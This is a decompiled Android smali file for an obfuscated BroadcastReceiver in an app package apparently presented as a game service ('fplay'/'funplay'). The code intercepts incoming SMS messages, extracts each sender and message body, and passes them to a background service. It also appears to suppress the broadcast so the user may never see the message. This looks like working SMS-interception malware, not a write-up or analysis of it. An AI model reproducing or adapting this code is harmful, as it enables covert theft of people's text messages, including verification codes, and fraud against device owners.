.class public Lcom/inter/china/fplay/service/LlcReceiverOne;
.super Landroid/content/BroadcastReceiver;
.source "LlcReceiverOne.java"


# instance fields
.field O000000o:Lcom/inter/china/fplay/service/LlcReceiverOne;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 19
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private O000000o()Z
    .locals 1

    .prologue
    .line 68
    invoke-virtual {p0}, Lcom/inter/china/fplay/service/LlcReceiverOne;->getResultCode()I

    move-result v0

    packed-switch v0, :pswitch_data_0

    .line 72
    const/4 v0, 0x0

    :goto_0
    return v0

    .line 70
    :pswitch_0
    const/4 v0, 0x1

    goto :goto_0

    .line 68
    nop

    :pswitch_data_0
    .packed-switch -0x1
        :pswitch_0
    .end packed-switch
.end method


# virtual methods
.method O000000o(Landroid/content/Intent;Landroid/content/Context;)V
    .locals 10

    .prologue
    const/4 v2, 0x0

    .line 78
    :try_start_0
    invoke-virtual {p2}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    .line 80
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 81
    if-eqz v0, :cond_1

    .line 82
    const-string v1, "pdus"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/Object;

    check-cast v0, [Ljava/lang/Object;

    .line 83
    if-eqz v0, :cond_1

    array-length v1, v0

    if-lez v1, :cond_1

    .line 84
    array-length v1, v0

    new-array v5, v1, [Landroid/telephony/SmsMessage;

    move v3, v2

    .line 85
    :goto_0
    array-length v1, v0

    if-ge v3, v1, :cond_0

    .line 86
    aget-object v1, v0, v3

    check-cast v1, [B

    check-cast v1, [B

    .line 87
    invoke-static {v1}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v1

    aput-object v1, v5, v3

    .line 85
    add-int/lit8 v1, v3, 0x1

    move v3, v1

    goto :goto_0

    .line 90
    :cond_0
    array-length v1, v5

    move v0, v2

    :goto_1
    if-ge v0, v1, :cond_1

    aget-object v3, v5, v0

    .line 91
    invoke-virtual {v3}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v6

    .line 92
    invoke-virtual {v3}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v3

    .line 94
    invoke-static {v3}, Lcom/inter/china/fplay/O00000oO/O0000Oo0;->O000000o(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 96
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "phone sender ; "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x0

    new-array v8, v8, [Ljava/lang/Object;

    invoke-static {v7, v8}, Lcom/inter/china/fplay/O00000Oo/O00000Oo;->O000000o(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 99
    new-instance v7, Landroid/content/Intent;

    const-class v8, Lcom/inter/china/fplay/service/LlcServoceOne;

    invoke-direct {v7, v4, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 100
    const-string v8, "funplay.service.commit"

    const-string v9, "com.funplay.handle.sms"

    invoke-virtual {v7, v8, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 101
    const-string v8, "sms_sender"

    invoke-virtual {v7, v8, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 102
    const-string v3, "sms_content"

    invoke-virtual {v7, v3, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 103
    invoke-virtual {v4, v7}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 90
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    .line 108
    :catch_0
    move-exception v0

    .line 109
    const-string v1, "sms is  error +  "

    new-array v2, v2, [Ljava/lang/Object;

    invoke-static {v0, v1, v2}, Lcom/inter/china/fplay/O00000Oo/O00000Oo;->O000000o(Ljava/lang/Throwable;Ljava/lang/String;[Ljava/lang/Object;)V

    .line 111
    :cond_1
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 5

    .prologue
    const/4 v1, 0x0

    .line 25
    const-class v0, Lcom/inter/china/fplay/service/LlcReceiverOne;

    const-string v2, "------------------------- onReceive start  ---------------------------"

    invoke-static {v0, v2}, Lcom/inter/china/fplay/O00000Oo/O000000o;->O00000o(Ljava/lang/Class;Ljava/lang/String;)V

    .line 26
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v2

    .line 27
    iput-object p0, p0, Lcom/inter/china/fplay/service/LlcReceiverOne;->O000000o:Lcom/inter/china/fplay/service/LlcReceiverOne;

    .line 28
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/inter/china/fplay/O00000oo/O000O0OO;->O000000o(Landroid/content/Context;)Landroid/content/SharedPreferences;

    .line 29
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\u83b7\u53d6\u5230\u7684action\u6570\u636e\u4e3a\uff1a"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-array v3, v1, [Ljava/lang/Object;

    invoke-static {v0, v3}, Lcom/inter/china/fplay/O00000Oo/O00000Oo;->O000000o(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 31
    invoke-static {v2}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 65
    :goto_0
    return-void

    .line 36
    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "action  :"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-array v3, v1, [Ljava/lang/Object;

    invoke-static {v0, v3}, Lcom/inter/china/fplay/O00000Oo/O00000Oo;->O000000o(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 38
    const/4 v0, -0x1

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v3

    sparse-switch v3, :sswitch_data_0

    :cond_1
    :goto_1
    packed-switch v0, :pswitch_data_0

    .line 61
    new-instance v0, Lcom/inter/china/fplay/O00000o0/O00000Oo;

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {p0}, Lcom/inter/china/fplay/service/LlcReceiverOne;->O000000o()Z

    move-result v3

    invoke-direct {v0, v1, p2, v2, v3}, Lcom/inter/china/fplay/O00000o0/O00000Oo;-><init>(Landroid/content/Context;Landroid/content/Intent;Ljava/lang/String;Z)V

    invoke-virtual {v0}, Lcom/inter/china/fplay/O00000o0/O00000Oo;->start()V

    goto :goto_0

    .line 38
    :sswitch_0
    const-string v3, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    move v0, v1

    goto :goto_1

    :sswitch_1
    const-string v3, "android.provider.Telephony.SMS_DELIVER"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    const/4 v0, 0x1

    goto :goto_1

    :sswitch_2
    const-string v3, "test.send.sms.action"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    const/4 v0, 0x2

    goto :goto_1

    .line 41
    :pswitch_0
    const-string v0, "---- > \u6267\u884c\u6d41\u7a0b SMS_DELIVER_ACTION "

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {v0, v1}, Lcom/inter/china/fplay/O00000Oo/O00000Oo;->O000000o(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 42
    invoke-static {p0}, Lcom/inter/china/fplay/login/O00000Oo;->O000000o(Landroid/content/BroadcastReceiver;)V

    .line 44
    invoke-virtual {p0, p2, p1}, Lcom/inter/china/fplay/service/LlcReceiverOne;->O000000o(Landroid/content/Intent;Landroid/content/Context;)V

    goto :goto_0

    .line 48
    :pswitch_1
    invoke-static {p0}, Lcom/inter/china/fplay/login/O00000Oo;->O000000o(Landroid/content/BroadcastReceiver;)V

    .line 50
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/inter/china/fplay/service/LlcServoceOne;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 51
    const-string v1, "sms_sender"

    invoke-virtual {p2, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 52
    const-string v2, "sms_content"

    invoke-virtual {p2, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 53
    const-string v3, "funplay.service.commit"

    const-string v4, "com.funplay.handle.sms"

    invoke-virtual {v0, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 54
    const-string v3, "sms_sender"

    invoke-virtual {v0, v3, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 55
    const-string v1, "sms_content"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 56
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto/16 :goto_0

    .line 38
    :sswitch_data_0
    .sparse-switch
        -0x160a16cb -> :sswitch_2
        -0xb09a9d5 -> :sswitch_1
        0x488b3d7b -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method
